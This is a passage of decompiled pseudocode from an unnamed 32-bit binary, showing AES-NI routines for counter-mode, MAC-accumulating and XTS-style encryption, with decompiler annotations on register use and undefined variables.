      aesenc  xmm2, xmm1
      aesenc  xmm3, xmm1
    }
    v14 = _mm_add_epi64(v14, v29);
    --a3;
    __asm
    {
      aesenclast xmm2, xmm0
      aesenclast xmm3, xmm0
    }
    ++a1;
    *a2 = _mm_xor_ps(v16, _XMM2);
    v11 = (__m128)_mm_shuffle_epi8(v14, v10);
    ++a2;
  }
  while ( a3 );
  *(_OWORD *)DWORD2(a4) = _XMM3;
  return 0i64;
}
// 409030: using guessed type __m128i var_2C;

//----- (00409160) --------------------------------------------------------
__int64 __usercall sub_409160@<xmm0>(__m128 *a1, __m128 *a2, int a3, __int128 a4)
{
  __m128i v6; // xmm7
  int v8; // ecx
  __m128i v9; // xmm5
  __m128 v10; // xmm2
  int v11; // ebx
  __m128i v12; // xmm7
  __int128 *v14; // edx
  int v17; // ebx
  __m128 v18; // xmm6
  __m128i v19; // xmm7
  __m128 *v20; // esi
  int v21; // edx
  int v22; // ebx
  __m128 v23; // xmm6
  __m128 v24; // xmm2
  int v25; // ecx
  bool v32; // zf
  int v35; // ecx
  __int128 *v37; // edx
  __m128i v41; // [esp+0h] [ebp-3Ch] BYREF
  __m128i v42; // [esp+10h] [ebp-2Ch]
  __int128 *v43; // [esp+30h] [ebp-Ch]
  __int128 vars0; // [esp+3Ch] [ebp+0h] BYREF

  v43 = &vars0;
  v6 = _mm_loadu_si128((const __m128i *)DWORD1(a4));
  _XMM3 = (__m128)_mm_loadu_si128((const __m128i *)DWORD2(a4));
  v8 = *(_DWORD *)(a4 + 240);
  v41.m128i_i64[0] = 0x8090A0B0C0D0E0Fi64;
  v41.m128i_i64[1] = 0x1020304050607i64;
  v42.m128i_i64[0] = 1i64;
  v42.m128i_i64[1] = 0i64;
  v9 = _mm_load_si128(&v41);
  v10 = (__m128)v6;
  v11 = v8;
  v12 = _mm_shuffle_epi8(v6, v9);
  _XMM1 = *(_OWORD *)(a4 + 16);
  v14 = (__int128 *)(a4 + 32);
  _XMM2 = _mm_xor_ps(v10, *(__m128 *)a4);
  do
  {
    __asm { aesenc  xmm2, xmm1 }
    --v8;
    _XMM1 = *v14++;
  }
  while ( v8 );
  __asm { aesenclast xmm2, xmm1 }
  v17 = 16 * v11;
  v18 = *a1;
  v19 = _mm_add_epi64(v12, v42);
  v20 = a1 + 1;
  v21 = a4 + 32 + v17;
  v22 = 16 - v17;
  while ( 1 )
  {
    v23 = _mm_xor_ps(v18, _XMM2);
    *a2++ = v23;
    v24 = (__m128)_mm_shuffle_epi8(v19, v9);
    if ( !--a3 )
      break;
    v25 = v22;
    _XMM1 = *(_OWORD *)(a4 + 16);
    _XMM2 = _mm_xor_ps(v24, *(__m128 *)a4);
    _XMM3 = _mm_xor_ps(_XMM3, _mm_xor_ps(v23, *(__m128 *)a4));
    _XMM0 = *(_OWORD *)(a4 + 32);
    do
    {
      __asm
      {
        aesenc  xmm2, xmm1
        aesenc  xmm3, xmm1
      }
      _XMM1 = *(_OWORD *)(v21 + v25);
      v32 = v25 == -32;
      v25 += 32;
      __asm
      {
        aesenc  xmm2, xmm0
        aesenc  xmm3, xmm0
      }
      _XMM0 = *(_OWORD *)(v21 + v25 - 16);
    }
    while ( !v32 );
    v18 = *v20;
    v19 = _mm_add_epi64(v19, v42);
    __asm
    {
      aesenc  xmm2, xmm1
      aesenc  xmm3, xmm1
      aesenclast xmm2, xmm0
      aesenclast xmm3, xmm0
    }
    ++v20;
  }
  v35 = *(_DWORD *)(a4 + 240);
  _XMM1 = *(_OWORD *)(a4 + 16);
  v37 = (__int128 *)(a4 + 32);
  _XMM3 = _mm_xor_ps(_XMM3, _mm_xor_ps(v23, *(__m128 *)a4));
  do
  {
    __asm { aesenc  xmm3, xmm1 }
    --v35;
    _XMM1 = *v37++;
  }
  while ( v35 );
  __asm { aesenclast xmm3, xmm1 }
  *(_OWORD *)DWORD2(a4) = _XMM3;
  return 0i64;
}
// 409160: using guessed type __m128i var_2C;

//----- (00409310) --------------------------------------------------------
void __cdecl sub_409310(__m128 *a1, __m128 *a2, unsigned int a3, __int128 a4)
{
  unsigned int v6; // eax
  _OWORD *v7; // edx
  __m128i v8; // xmm7
  unsigned int epi32; // ebx
  __m128i inserted; // xmm7
  int v11; // ecx
  int v12; // ebx
  __m128i v13; // xmm2
  __m128i v14; // xmm0
  __m128i v15; // xmm6
  __m128i v16; // xmm1
  __m128i v17; // xmm2
  __m128i v18; // xmm3
  int v19; // ecx
  int v20; // ebx
  int v21; // edx
  __m128i v22; // xmm4
  __m128i v23; // xmm0
  __m128i v24; // xmm5
  __m128i v26; // xmm6
  __m128i v28; // xmm7
  __m128 v40; // xmm1
  __m128 v41; // xmm3
  __m128i v42; // xmm0
  __m128 v43; // xmm4
  __m128i v44; // xmm1
  __m128i v45; // xmm1
  __m128i v46; // xmm2
  __m128 v47; // xmm4
  __m128 v48; // xmm5
  __m128 v49; // xmm3
  unsigned int v50; // eax
  bool v51; // cf
  unsigned int v52; // eax
  __m128 v53; // xmm2
  __m128i v54; // xmm4
  __m128 v55; // xmm3
  __m128i v56; // xmm5
  __m128 v57; // xmm4
  __m128i v58; // xmm6
  __m128 v59; // xmm5
  __m128 v60; // xmm6
  __m128 v61; // xmm3
  __m128 v62; // xmm4
  __m128 v63; // xmm1
  __m128 v64; // xmm5
  __m128 v65; // xmm0
  __int128 *v67; // edx
  __m128 v70; // xmm3
  __m128 v71; // xmm7
  __m128 v72; // xmm3
  __m128 v73; // xmm1
  __m128 v74; // xmm0
  __m128 v75; // xmm3
  __m128i v76; // [esp+0h] [ebp-58h] BYREF
  __m128i v77; // [esp+10h] [ebp-48h] BYREF
  __m128i v78; // [esp+20h] [ebp-38h] BYREF
  __m128i v79; // [esp+30h] [ebp-28h]
  __m128i v80; // [esp+40h] [ebp-18h] BYREF
  __int128 *v81; // [esp+50h] [ebp-8h]
  __int128 vars0; // [esp+58h] [ebp+0h] BYREF

  v6 = a3;
  v7 = (_OWORD *)a4;
  v81 = &vars0;
  if ( a3 == 1 )
  {
    v53 = *(__m128 *)DWORD1(a4);
    v11 = *(_DWORD *)(a4 + 240);
LABEL_13:
    v65 = *(__m128 *)v7;
    _XMM1 = v7[1];
    v67 = v7 + 2;
    _XMM2 = _mm_xor_ps(v53, v65);
    do
    {
      __asm { aesenc  xmm2, xmm1 }
      --v11;
      _XMM1 = *v67++;
    }
    while ( v11 );
    __asm { aesenclast xmm2, xmm1 }
    *a2 = _mm_xor_ps(*a1, _XMM2);
    return;
  }
  v8 = _mm_loadu_si128((const __m128i *)DWORD1(a4));
  v76.m128i_i64[0] = 0x8090A0B0C0D0E0Fi64;
  v76.m128i_i64[1] = 0x1020304050607i64;
  v77.m128i_i64[0] = 0x600000006i64;
  v77.m128i_i64[1] = 6i64;
  epi32 = _mm_extract_epi32(v8, 3);
  inserted = _mm_insert_epi32(v8, 0, 3);
  v11 = *(_DWORD *)(a4 + 240);
  v12 = _byteswap_ulong(epi32);
  v13 = _mm_load_si128(&v76);
  v79 = _mm_insert_epi32(_mm_insert_epi32(_mm_insert_epi32((__m128i)0i64, v12, 0), v12 + 1, 1), v12 + 2, 2);
  v14 = _mm_shuffle_epi8(v79, v13);
  v15 = _mm_loadu_si128((const __m128i *)a4);
  v80 = _mm_insert_epi32(_mm_insert_epi32(_mm_insert_epi32((__m128i)0i64, v12 + 3, 0), v12 + 4, 1), v12 + 5, 2);
  v16 = _mm_shuffle_epi8(v80, v13);
  v17 = _mm_shuffle_epi32(v14, 192);
  v18 = _mm_shuffle_epi32(v14, 128);
  if ( a3 < 6 )
  {
LABEL_7:
    v53 = (__m128)_mm_or_si128(v17, inserted);
    if ( v6 >= 2 )
    {
      v54 = _mm_shuffle_epi32(v14, 64);
      v55 = (__m128)_mm_or_si128(v18, inserted);
      if ( v6 == 2 )
      {
        sub_408820((int)v7, v11, v53, (__m128i)v55);
        v70 = _mm_xor_ps(v55, a1[1]);
        *a2 = _mm_xor_ps(v53, *a1);
        a2[1] = v70;
      }
      else
      {
        v56 = _mm_shuffle_epi32(v16, 192);
        v57 = (__m128)_mm_or_si128(v54, inserted);
        if ( v6 < 4 )
        {
          sub_4088E0((int)v7, v11, v53, (__m128i)v55, (__m128i)v57);
          v71 = a1[2];
          v72 = _mm_xor_ps(v55, a1[1]);
          *a2 = _mm_xor_ps(v53, *a1);
          a2[1] = v72;
          a2[2] = _mm_xor_ps(v57, v71);
        }
        else
        {
          v58 = _mm_shuffle_epi32(v16, 128);
          v59 = (__m128)_mm_or_si128(v56, inserted);
          if ( v6 == 4 )
          {
            sub_4089E0((int)v7, v11, v53, (__m128i)v55, (__m128i)v57, (__m128i)v59);
            v73 = a1[2];
            v74 = a1[3];
            v75 = _mm_xor_ps(v55, a1[1]);
            *a2 = _mm_xor_ps(v53, *a1);
            a2[1] = v75;
            a2[2] = _mm_xor_ps(v57, v73);
            a2[3] = _mm_xor_ps(v59, v74);
          }
          else
          {
            v60 = (__m128)_mm_or_si128(v58, inserted);
            sub_408B00((int)v7, v11, v53, (__m128i)v55, (__m128i)v57, (__m128i)v59, (__m128i)v60, inserted);
            v61 = _mm_xor_ps(v55, a1[1]);
            v62 = _mm_xor_ps(v57, a1[2]);
            v63 = a1[4];
            v64 = _mm_xor_ps(v59, a1[3]);
            *a2 = _mm_xor_ps(v53, *a1);
            a2[1] = v61;
            a2[2] = v62;
            a2[3] = v64;
            a2[4] = _mm_xor_ps(v60, v63);
          }
        }
      }
      return;
    }
    goto LABEL_13;
  }
  v19 = 16 * v11;
  v78 = _mm_xor_si128(inserted, v15);
  v20 = 16 - v19;
  v21 = a4 + v19 + 32;
  do
  {
    v22 = _mm_shuffle_epi32(v14, 64);
    v23 = _mm_load_si128(&v78);
    v24 = _mm_shuffle_epi32(v16, 192);
    _XMM2 = _mm_xor_si128(v17, v23);
    v26 = _mm_shuffle_epi32(v16, 128);
    _XMM3 = _mm_xor_si128(v18, v23);
    v28 = _mm_shuffle_epi32(v16, 64);
    _XMM1 = *(_OWORD *)(a4 + 16);
    _XMM4 = _mm_xor_si128(v22, v23);
    _XMM5 = _mm_xor_si128(v24, v23);
    __asm { aesenc  xmm2, xmm1 }
    _XMM6 = _mm_xor_si128(v26, v23);
    _XMM7 = _mm_xor_si128(v28, v23);
    __asm
    {
      aesenc  xmm3, xmm1
      aesenc  xmm4, xmm1
      aesenc  xmm5, xmm1
      aesenc  xmm6, xmm1
      aesenc  xmm7, xmm1
    }
    sub_408B6E(v21, v20, *(_OWORD *)(a4 + 32), _XMM2, _XMM3, _XMM4, _XMM5, _XMM6, _XMM7);
    v40 = a1[2];
    v41 = _mm_xor_ps((__m128)_XMM3, a1[1]);
    *a2 = _mm_xor_ps((__m128)_XMM2, *a1);
    v42 = _mm_load_si128(&v77);
    v43 = _mm_xor_ps((__m128)_XMM4, v40);
    v44 = _mm_load_si128(&v80);
    a2[1] = v41;
    a2[2] = v43;
    v45 = _mm_add_epi32(v44, v42);
    v46 = _mm_load_si128(&v76);
    v47 = a1[4];
    v48 = _mm_xor_ps((__m128)_XMM5, a1[3]);
    v49 = a1[5];
    a1 += 6;
    v79 = _mm_add_epi32(v42, v79);
    v14 = _mm_shuffle_epi8(v79, v46);
    a2[3] = v48;
    v80 = v45;
    v16 = _mm_shuffle_epi8(v45, v46);
    a2[4] = _mm_xor_ps((__m128)_XMM6, v47);
    v17 = _mm_shuffle_epi32(v14, 192);
    a2[5] = _mm_xor_ps((__m128)_XMM7, v49);
    a2 += 6;
    v18 = _mm_shuffle_epi32(v14, 128);
    v51 = v50 < 6;
    v52 = v50 - 6;
  }
  while ( !v51 );
  v6 = v52 + 6;
  if ( v6 )
  {
    v7 = (_OWORD *)a4;
    inserted = _mm_xor_si128(_mm_loadu_si128((const __m128i *)a4), v78);
    v11 = *(_DWORD *)(a4 + 240);
    goto LABEL_7;
  }
}
// 40947A: variable 'v21' is possibly undefined
// 409500: variable 'v50' is possibly undefined

//----- (004096B0) --------------------------------------------------------
int __cdecl sub_4096B0(int a1, __m128 *a2, int a3, int a4, int a5, __m128 *a6)
{
  int v6; // ecx
  __int128 *v8; // edx
  _OWORD *v13; // edx
  int v14; // ecx
  __m128 v15; // xmm1
  __m128i v16; // xmm3
  __m128i v17; // xmm0
  int v18; // ebx
  unsigned int v19; // eax
  int v20; // ecx
  int v21; // ebx
  int v22; // edx
  __m128i v23; // xmm1
  __m128i v24; // xmm2
  __m128i v25; // xmm0
  __m128i v26; // xmm1
  __m128i v27; // xmm2
  __m128i v28; // xmm0
  __m128i v29; // xmm1
  __m128i v30; // xmm2
  __m128i v31; // xmm0
  __m128i v32; // xmm1
  __m128i v33; // xmm0
  __m128i v34; // xmm7
  __m128i v35; // xmm2
  __m128i v36; // xmm3
  __m128i v37; // xmm4
  __m128i v38; // xmm5
  __m128i v39; // xmm1
  __m128i v40; // xmm6
  __m128i v42; // xmm7
  __m128 v55; // xmm1
  __m128i v56; // xmm2
  __m128i v57; // xmm1
  unsigned int v58; // eax
  bool v59; // cf
  unsigned int v60; // eax
  __m128 v61; // xmm5
  __m128i v62; // xmm1
  __m128i v63; // xmm2
  __m128i v64; // xmm0
  __m128 v65; // xmm1
  __m128 v66; // xmm6
  __m128i v67; // xmm1
  __m128i v68; // xmm2
  __m128i v69; // xmm0
  __m128 v70; // xmm7
  __m128i v71; // xmm1
  __m128i v72; // xmm2
  __m128i v73; // xmm0
  __m128 v74; // xmm7
  __m128 v75; // xmm2
  __m128i v76; // xmm5
  __m128 v77; // xmm3
  __m128i v78; // xmm6
  __m128 v79; // xmm4
  __m128 v80; // xmm5
  __m128 v81; // xmm6
  __m128 v82; // xmm2
  __m128 v83; // xmm2
  __m128 v84; // xmm0
  __int128 *v86; // edx
  __m128 v89; // xmm2
  __m128 v90; // xmm3
  __m128 v91; // xmm2
  __m128 v92; // xmm3
  __m128 v93; // xmm2
  __m128 v94; // xmm3
  __m128 v95; // xmm4
  __m128 v96; // xmm2
  __m128 v97; // xmm3
  __m128 v98; // xmm4
  __m128 v99; // xmm3
  __m128 v100; // xmm4
  __m128 v101; // xmm2
  __m128 v102; // xmm5
  __m128 v103; // xmm3
  __m128 v104; // xmm4
  __m128 v105; // xmm5
  int result; // eax
  __m128 v107; // xmm5
  __int8 v108; // cl
  __int8 v109; // dl
  __m128 *v110; // edi
  int v111; // ecx
  __int128 *v113; // edx
  __m128 v116; // [esp+0h] [ebp-88h]
  __m128 v117; // [esp+0h] [ebp-88h]
  __m128 v118; // [esp+10h] [ebp-78h]
  __m128 v119; // [esp+10h] [ebp-78h]
  __m128 v120; // [esp+20h] [ebp-68h]
  __m128 v121; // [esp+20h] [ebp-68h]
  __m128 v122; // [esp+30h] [ebp-58h]
  __m128 v123; // [esp+30h] [ebp-58h]
  __m128 v124; // [esp+40h] [ebp-48h]
  __m128i v125; // [esp+50h] [ebp-38h] BYREF
  __m128i v126; // [esp+60h] [ebp-28h] BYREF
  int v127; // [esp+70h] [ebp-18h]
  int *v128; // [esp+74h] [ebp-14h]
  int v129; // [esp+78h] [ebp-10h] BYREF

  v6 = *(_DWORD *)(a5 + 240);
  _XMM1 = *(_OWORD *)(a5 + 16);
  v8 = (__int128 *)(a5 + 32);
  _XMM2 = _mm_xor_ps(*a6, *(__m128 *)a5);
  do
  {
    __asm { aesenc  xmm2, xmm1 }
    --v6;
    _XMM1 = *v8++;
  }
  while ( v6 );
  __asm { aesenclast xmm2, xmm1 }
  v13 = (_OWORD *)a4;
  v14 = *(_DWORD *)(a4 + 240);
  v126.m128i_i64[0] = 135i64;
  v126.m128i_i64[1] = 1i64;
  v127 = a3;
  v128 = &v129;
  v15 = (__m128)_XMM2;
  v16 = _mm_load_si128(&v126);
  v17 = _mm_cmpgt_epi32((__m128i)0i64, _XMM2);
  v18 = v14;
  v19 = (a3 & 0xFFFFFFF0) - 96;
  if ( (a3 & 0xFFFFFFF0) >= 0x60 )
  {
    v20 = 16 * v14;
    v21 = 16 - v20;
    v22 = a4 + v20 + 32;
    do
    {
      v116 = v15;
      v23 = _mm_add_epi64((__m128i)v15, (__m128i)v15);
      v24 = _mm_and_si128(_mm_shuffle_epi32(v17, 19), v16);
      v25 = _mm_cmpgt_epi32((__m128i)0i64, v23);
      v118 = (__m128)_mm_xor_si128(v23, v24);
      v26 = _mm_add_epi64((__m128i)v118, (__m128i)v118);
      v27 = _mm_and_si128(_mm_shuffle_epi32(v25, 19), v16);
      v28 = _mm_cmpgt_epi32((__m128i)0i64, v26);
      v120 = (__m128)_mm_xor_si128(v26, v27);
      v29 = _mm_add_epi64((__m128i)v120, (__m128i)v120);
      v30 = _mm_and_si128(_mm_shuffle_epi32(v28, 19), v16);
      v31 = _mm_cmpgt_epi32((__m128i)0i64, v29);
      v122 = (__m128)_mm_xor_si128(v29, v30);
      v32 = _mm_add_epi64((__m128i)v122, (__m128i)v122);
      v124 = (__m128)_mm_xor_si128(v32, _mm_and_si128(_mm_shuffle_epi32(v31, 19), v16));
      v33 = *(__m128i *)a4;
      v34 = _mm_xor_si128(
              _mm_and_si128(_mm_shuffle_epi32(_mm_cmpgt_epi32((__m128i)0i64, v32), 19), v16),
              _mm_add_epi64((__m128i)v124, (__m128i)v124));
      v35 = (__m128i)_mm_xor_ps(*(__m128 *)a1, *(__m128 *)a4);
      v36 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 16)), *(__m128i *)a4);
      v37 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 32)), *(__m128i *)a4);
      v38 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 48)), *(__m128i *)a4);
      v39 = _mm_loadu_si128((const __m128i *)(a1 + 80));
      v40 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 64)), *(__m128i *)a4);
      a1 += 96;
      _XMM2 = _mm_xor_si128(v35, (__m128i)v116);
      v125 = v34;
      v42 = _mm_xor_si128(v34, v39);
      _XMM1 = *(_OWORD *)(a4 + 16);
      _XMM3 = _mm_xor_si128(v36, (__m128i)v118);
      _XMM4 = _mm_xor_si128(v37, (__m128i)v120);
      __asm { aesenc  xmm2, xmm1 }
      _XMM5 = _mm_xor_si128(v38, (__m128i)v122);
      _XMM6 = _mm_xor_si128(v40, (__m128i)v124);
      __asm { aesenc  xmm3, xmm1 }
      _XMM7 = _mm_xor_si128(v42, v33);
      __asm
      {
        aesenc  xmm4, xmm1
        aesenc  xmm5, xmm1
        aesenc  xmm6, xmm1
        aesenc  xmm7, xmm1
      }
      sub_408B6E(v22, v21, *(_OWORD *)(a4 + 32), _XMM2, _XMM3, _XMM4, _XMM5, _XMM6, _XMM7);
      v55 = (__m128)_mm_load_si128(&v125);
      *a2 = _mm_xor_ps((__m128)_XMM2, v116);
      a2[1] = _mm_xor_ps((__m128)_XMM3, v118);
      a2[2] = _mm_xor_ps((__m128)_XMM4, v120);
      a2[3] = _mm_xor_ps((__m128)_XMM5, v122);
      a2[4] = _mm_xor_ps((__m128)_XMM6, v124);
      v56 = _mm_shuffle_epi32(_mm_cmpgt_epi32((__m128i)0i64, (__m128i)v55), 19);
      a2[5] = _mm_xor_ps((__m128)_XMM7, v55);
      a2 += 6;
      v16 = _mm_load_si128(&v126);
      v57 = _mm_add_epi64((__m128i)v55, (__m128i)v55);
      v17 = _mm_cmpgt_epi32((__m128i)0i64, v57);
      v15 = (__m128)_mm_xor_si128(v57, _mm_and_si128(v56, v16));
      v59 = v58 < 0x60;
      v19 = v58 - 96;
    }
    while ( !v59 );
    v14 = *(_DWORD *)(a4 + 240);
    v13 = (_OWORD *)a4;
    v18 = v14;
  }
  v60 = v19 + 96;
  if ( !v60 )
  {
    result = v127 & 0xF;
    if ( (v127 & 0xF) == 0 )
      return result;
    v107 = v15;
    v127 &= 0xFu;
    goto LABEL_23;
  }
  v61 = v15;
  if ( v60 < 0x20 )
  {
    v82 = *(__m128 *)a1;
    a1 += 16;
    v83 = _mm_xor_ps(v82, v15);
    v84 = *(__m128 *)v13;
    _XMM1 = v13[1];
    v86 = v13 + 2;
    _XMM2 = _mm_xor_ps(v83, v84);
    do
    {
      __asm { aesenc  xmm2, xmm1 }
      --v14;
      _XMM1 = *v86++;
    }
    while ( v14 );
    __asm { aesenclast xmm2, xmm1 }
    *a2++ = _mm_xor_ps(_XMM2, v61);
    v65 = v61;
  }
  else
  {
    v62 = _mm_add_epi64((__m128i)v15, (__m128i)v15);
    v63 = _mm_and_si128(_mm_shuffle_epi32(v17, 19), v16);
    v64 = _mm_cmpgt_epi32((__m128i)0i64, v62);
    v65 = (__m128)_mm_xor_si128(v62, v63);
    if ( v60 == 32 )
    {
      v89 = *(__m128 *)a1;
      v90 = *(__m128 *)(a1 + 16);
      a1 += 32;
      v91 = _mm_xor_ps(v89, v61);
      v92 = _mm_xor_ps(v90, v65);
      sub_408820((int)v13, v14, v91, (__m128i)v92);
      *a2 = _mm_xor_ps(v91, v61);
      a2[1] = _mm_xor_ps(v92, v65);
      a2 += 2;
    }
    else
    {
      v66 = v65;
      v67 = _mm_add_epi64((__m128i)v65, (__m128i)v65);
      v68 = _mm_and_si128(_mm_shuffle_epi32(v64, 19), v16);
      v69 = _mm_cmpgt_epi32((__m128i)0i64, v67);
      v65 = (__m128)_mm_xor_si128(v67, v68);
      if ( v60 < 0x40 )
      {
        v93 = *(__m128 *)a1;
        v94 = *(__m128 *)(a1 + 16);
        v95 = *(__m128 *)(a1 + 32);
        a1 += 48;
        v96 = _mm_xor_ps(v93, v61);
        v97 = _mm_xor_ps(v94, v66);
        v98 = _mm_xor_ps(v95, v65);
        sub_4088E0((int)v13, v14, v96, (__m128i)v97, (__m128i)v98);
        *a2 = _mm_xor_ps(v96, v61);
        a2[1] = _mm_xor_ps(v97, v66);
        a2[2] = _mm_xor_ps(v98, v65);
        a2 += 3;
      }
      else
      {
        v70 = v65;
        v71 = _mm_add_epi64((__m128i)v65, (__m128i)v65);
        v72 = _mm_and_si128(_mm_shuffle_epi32(v69, 19), v16);
        v73 = _mm_cmpgt_epi32((__m128i)0i64, v71);
        v65 = (__m128)_mm_xor_si128(v71, v72);
        v117 = v61;
        v119 = v66;
        if ( v60 == 64 )
        {
          v99 = *(__m128 *)(a1 + 16);
          v100 = *(__m128 *)(a1 + 32);
          v101 = _mm_xor_ps(*(__m128 *)a1, v61);
          v102 = *(__m128 *)(a1 + 48);
          a1 += 64;
          v103 = _mm_xor_ps(v99, v66);
          v104 = _mm_xor_ps(v100, v70);
          v105 = _mm_xor_ps(v102, v65);
          sub_4089E0((int)v13, v14, v101, (__m128i)v103, (__m128i)v104, (__m128i)v105);
          *a2 = _mm_xor_ps(v101, v117);
          a2[1] = _mm_xor_ps(v103, v66);
          a2[2] = _mm_xor_ps(v104, v70);
          a2[3] = _mm_xor_ps(v105, v65);
          a2 += 4;
        }
        else
        {
          v121 = v70;
          v123 = v65;
          v74 = (__m128)_mm_xor_si128(
                          _mm_and_si128(_mm_shuffle_epi32(v73, 19), v16),
                          _mm_add_epi64((__m128i)v65, (__m128i)v65));
          v75 = (__m128)_mm_xor_si128(_mm_loadu_si128((const __m128i *)a1), (__m128i)v61);
          v76 = _mm_loadu_si128((const __m128i *)(a1 + 48));
          v77 = (__m128)_mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 16)), (__m128i)v66);
          v78 = _mm_loadu_si128((const __m128i *)(a1 + 64));
          v79 = (__m128)_mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 32)), (__m128i)v121);
          a1 += 80;
          v80 = (__m128)_mm_xor_si128(v76, (__m128i)v65);
          v81 = (__m128)_mm_xor_si128(v78, (__m128i)v74);
          sub_408B00((int)v13, v14, v75, (__m128i)v77, (__m128i)v79, (__m128i)v80, (__m128i)v81, (__m128i)v74);
          v65 = v74;
          *a2 = _mm_xor_ps(v75, v117);
          a2[1] = _mm_xor_ps(v77, v119);
          a2[2] = _mm_xor_ps(v79, v121);
          a2[3] = _mm_xor_ps(v80, v123);
          a2[4] = _mm_xor_ps(v81, v74);
          a2 += 5;
        }
      }
    }
  }
  result = v127 & 0xF;
  if ( (v127 & 0xF) != 0 )
  {
    v127 &= 0xFu;
    v107 = (__m128)_mm_xor_si128(
                     _mm_and_si128(_mm_shuffle_epi32(_mm_cmpgt_epi32((__m128i)0i64, (__m128i)v65), 19), v126),
                     _mm_add_epi64((__m128i)v65, (__m128i)v65));
    do
    {
LABEL_23:
      v108 = *(_BYTE *)a1;
      v109 = a2[-1].m128_i8[0];
      ++a1;
      a2[-1].m128_i8[0] = v108;
      a2->m128_i8[0] = v109;
      a2 = (__m128 *)((char *)a2 + 1);
      --result;
    }
    while ( result );
    v110 = (__m128 *)((char *)a2 - v127);
    v111 = v18;
    _XMM1 = *(_OWORD *)(a4 + 16);
    v113 = (__int128 *)(a4 + 32);
    _XMM2 = _mm_xor_ps(_mm_xor_ps(v110[-1], v107), *(__m128 *)a4);
    do
    {
      __asm { aesenc  xmm2, xmm1 }
      --v111;
      _XMM1 = *v113++;
    }
    while ( v111 );
    __asm { aesenclast xmm2, xmm1 }
    v110[-1] = _mm_xor_ps(_XMM2, v107);
  }
  return result;
}
// 40988B: variable 'v22' is possibly undefined
// 4098F2: variable 'v58' is possibly undefined

//----- (00409C40) --------------------------------------------------------
int __cdecl sub_409C40(int a1, __m128 *a2, int a3, int a4, int a5, __m128 *a6)
{
  int v6; // ecx
  __int128 *v8; // edx
  _OWORD *v13; // edx
  int v14; // ecx
  int v15; // ebx
  __m128 v16; // xmm1
  __m128i v17; // xmm3
  __m128i v18; // xmm0
  unsigned int v19; // eax
  int v20; // ebx
  __m128i v21; // xmm1
  __m128i v22; // xmm2
  __m128i v23; // xmm0
  __m128i v24; // xmm1
  __m128i v25; // xmm2
  __m128i v26; // xmm0
  __m128i v27; // xmm1
  __m128i v28; // xmm2
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm0
  __m128i v32; // xmm7
  __m128i v33; // xmm2
  __m128i v34; // xmm3
  __m128i v35; // xmm4
  __m128i v36; // xmm5
  __m128i v37; // xmm1
  __m128i v38; // xmm6
  __m128i v40; // xmm7
  unsigned int v53; // eax
  __m128 v54; // xmm1
  __m128i v55; // xmm2
  __m128i v56; // xmm1
  bool v57; // cf
  unsigned int v58; // eax
  __m128 v59; // xmm5
  __m128i v60; // xmm1
  __m128i v61; // xmm2
  __m128i v62; // xmm0
  __m128 v63; // xmm1
  __m128 v64; // xmm6
  __m128i v65; // xmm1
  __m128i v66; // xmm2
  __m128i v67; // xmm0
  __m128 v68; // xmm7
  __m128i v69; // xmm1
  __m128i v70; // xmm2
  __m128i v71; // xmm0
  __m128 v72; // xmm7
  __m128 v73; // xmm2
  __m128i v74; // xmm5
  __m128 v75; // xmm3
  __m128i v76; // xmm6
  __m128 v77; // xmm4
  __m128 v78; // xmm5
  __m128 v79; // xmm6
  __m128 v80; // xmm2
  __m128 v81; // xmm2
  __m128 v82; // xmm0
  __int128 *v84; // edx
  __m128 v87; // xmm2
  __m128 v88; // xmm3
  __m128 v89; // xmm2
  __m128 v90; // xmm3
  __m128 v91; // xmm2
  __m128 v92; // xmm3
  __m128 v93; // xmm4
  __m128 v94; // xmm2
  __m128 v95; // xmm3
  __m128 v96; // xmm4
  __m128 v97; // xmm3
  __m128 v98; // xmm4
  __m128 v99; // xmm2
  __m128 v100; // xmm5
  __m128 v101; // xmm3
  __m128 v102; // xmm4
  __m128 v103; // xmm5
  int result; // eax
  __m128i v105; // xmm2
  __m128i v106; // xmm1
  __m128 v107; // xmm6
  __m128 v108; // xmm5
  int v109; // ecx
  __int128 *v111; // edx
  __int8 v114; // cl
  __int8 v115; // dl
  __m128 *v116; // edi
  int v117; // ecx
  __int128 *v119; // edx
  __m128 v122; // [esp+0h] [ebp-88h]
  __m128 v123; // [esp+0h] [ebp-88h]
  __m128 v124; // [esp+10h] [ebp-78h]
  __m128 v125; // [esp+10h] [ebp-78h]
  __m128 v126; // [esp+20h] [ebp-68h]
  __m128 v127; // [esp+20h] [ebp-68h]
  __m128 v128; // [esp+30h] [ebp-58h]
  __m128 v129; // [esp+30h] [ebp-58h]
  __m128 v130; // [esp+40h] [ebp-48h]
  __m128i v131; // [esp+50h] [ebp-38h] BYREF
  __m128i v132; // [esp+60h] [ebp-28h] BYREF
  int v133; // [esp+70h] [ebp-18h]
  int *v134; // [esp+74h] [ebp-14h]
  int v135; // [esp+78h] [ebp-10h] BYREF

  v6 = *(_DWORD *)(a5 + 240);
  _XMM1 = *(_OWORD *)(a5 + 16);
  v8 = (__int128 *)(a5 + 32);
  _XMM2 = _mm_xor_ps(*a6, *(__m128 *)a5);
  do
  {
    __asm { aesenc  xmm2, xmm1 }
    --v6;
    _XMM1 = *v8++;
  }
  while ( v6 );
  __asm { aesenclast xmm2, xmm1 }
  v13 = (_OWORD *)a4;
  v132.m128i_i64[0] = 135i64;
  v132.m128i_i64[1] = 1i64;
  v133 = a3 - 16 * ((a3 & 0xF) != 0);
  v134 = &v135;
  v14 = *(_DWORD *)(a4 + 240);
  v15 = v14;
  v16 = (__m128)_XMM2;
  v17 = _mm_load_si128(&v132);
  v18 = _mm_cmpgt_epi32((__m128i)0i64, _XMM2);
  v19 = (v133 & 0xFFFFFFF0) - 96;
  if ( (v133 & 0xFFFFFFF0) >= 0x60 )
  {
    v20 = 16 - 16 * v14;
    do
    {
      v122 = v16;
      v21 = _mm_add_epi64((__m128i)v16, (__m128i)v16);
      v22 = _mm_and_si128(_mm_shuffle_epi32(v18, 19), v17);
      v23 = _mm_cmpgt_epi32((__m128i)0i64, v21);
      v124 = (__m128)_mm_xor_si128(v21, v22);
      v24 = _mm_add_epi64((__m128i)v124, (__m128i)v124);
